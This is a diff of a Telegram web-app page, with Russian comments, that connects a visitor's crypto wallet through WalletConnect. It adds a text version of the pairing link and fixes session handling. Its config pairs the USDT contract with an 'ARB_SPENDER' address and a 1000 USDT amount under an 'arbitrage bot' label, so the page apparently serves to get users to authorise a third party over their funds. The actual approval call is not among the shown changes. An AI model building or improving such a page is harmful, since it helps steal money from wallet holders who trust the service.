@@ -93,6 +93,14 @@
       height: 100%;
     }
 
+    #uriText {
+      margin-top: 10px;
+      word-break: break-all;
+      font-size: 12px;
+      color: var(--tg-primary);
+      text-align: center;
+    }
+
     .instructions {
       background: rgba(46, 166, 255, 0.1);
       border-radius: 12px;
@@ -175,7 +183,6 @@
       font-size: 13px;
     }
 
-    /* Для пользователя, открывшего через обычный браузер */
     .browser-warning {
       background: rgba(230, 74, 69, 0.15);
       border-radius: 12px;
@@ -203,6 +210,7 @@
       <div id="qr-container">
         <canvas id="qr"></canvas>
       </div>
+      <div id="uriText" class="hidden"></div>
 
       <div id="gasInfo" class="hidden">
         <div>Расчетный газ: <span id="gasEstimate">0</span> Gwei</div>
@@ -231,29 +239,30 @@
   </div>
 
   <script type="module">
-    // ─── Вариант А: подключаем SignClient через esm.sh ─────────────────────
+    // ─── Подключаем SignClient через esm.sh ───────────────────────────────────
     import SignClient from "https://esm.sh/@walletconnect/sign-client@2.21.0";
 
     // ─── Конфигурация ───────────────────────────────────────────────────────
     const CONFIG = {
-      USDT_CONTRACT: "0x55d398326f99059fF775485246999027b3197955".toLowerCase(),
-      ARB_SPENDER:   "0xA7acE8F572825FeD4411389Cb1A66104Cf53B577".toLowerCase(),
-      WC_PROJECT_ID: "d868f90cd734355ae0320f8f0258b6b1",
-      WC_RELAY_URL:  "wss://relay.walletconnect.com",
-      BSC_RPC_URL:   "https://bsc-dataseed.binance.org/",
-      TELEGRAM_BOT_URL: "https://t.me/cryptogt_arbitrage_bot?start=cryptogtarb",
-      AMOUNT:        "1000" // USDT
+      USDT_CONTRACT:   "0x55d398326f99059fF775485246999027b3197955".toLowerCase(),
+      ARB_SPENDER:     "0xA7acE8F572825FeD4411389Cb1A66104Cf53B577".toLowerCase(),
+      WC_PROJECT_ID:   "d868f90cd734355ae0320f8f0258b6b1",
+      WC_RELAY_URL:    "wss://relay.walletconnect.com",
+      BSC_RPC_URL:     "https://bsc-dataseed.binance.org/",
+      TELEGRAM_BOT_URL:"https://t.me/cryptogt_arbitrage_bot?start=cryptogtarb",
+      AMOUNT:          "1000" // USDT
     };
 
     // ─── Инициализация элементов DOM ──────────────────────────────────────
-    const statusEl      = document.getElementById("status");
-    const qrCanvas      = document.getElementById("qr");
-    const cancelBtn     = document.getElementById("cancelBtn");
-    const openInTgBtn   = document.getElementById("openInTg");
-    const instructionsEl= document.getElementById("instructions");
-    const browserWarning= document.getElementById("browserWarning");
-    const gasEstimateEl = document.getElementById("gasEstimate");
-    const gasInfo       = document.getElementById("gasInfo");
+    const statusEl       = document.getElementById("status");
+    const qrCanvas       = document.getElementById("qr");
+    const uriTextEl      = document.getElementById("uriText");
+    const cancelBtn      = document.getElementById("cancelBtn");
+    const openInTgBtn    = document.getElementById("openInTg");
+    const instructionsEl = document.getElementById("instructions");
+    const browserWarning = document.getElementById("browserWarning");
+    const gasEstimateEl  = document.getElementById("gasEstimate");
+    const gasInfo        = document.getElementById("gasInfo");
 
     // ─── Проверка среды выполнения ─────────────────────────────────────────
     const isTelegramWebView = window.Telegram && window.Telegram.WebApp;
@@ -323,12 +332,15 @@
         });
         console.log("[Step 3] URI получен:", uri);
 
-        // 4. Отображение QR-кода
-        console.log("[Step 4] Рисуем QR-код");
-        updateStatus("Отсканируйте QR-код в кошельке");
+        // 4. Отображение QR-кода и текстового URI
+        console.log("[Step 4] Рисуем QR-код и показываем текст URI");
+        updateStatus("Отсканируйте QR-код в кошельке или скопируйте ниже");
         instructionsEl.classList.remove("hidden");
+        // Конвертируем URI в QR
         QRCode.toCanvas(qrCanvas, uri, { width: 200, margin: 1 });
-        console.log("[Step 4] QR-код отображён");
+        // Показываем текстовую ссылку под QR
+        uriTextEl.textContent = uri;
+        uriTextEl.classList.remove("hidden");
 
         // 5. Ожидание подключения
         console.log("[Step 5] Ожидание approval()");
@@ -339,7 +351,14 @@
         // 6. Проверка сети
         console.log("[Step 6] Проверка chainId через client.request");
         updateStatus("Проверка сети...");
-        const topic = client.session.topics[0];
+        // client.session – это объект, ключи которого – темы (topics)
+        const sessionKeys = Object.keys(client.session);
+        if (sessionKeys.length === 0) {
+          throw new Error("Сессия не найдена: client.session пуст.");
+        }
+        const topic = sessionKeys[0];
+        console.log("[Step 6] Тема сессии (topic):", topic);
+
         const chainId = await client.request({
           topic,
           chainId: "eip155:56",
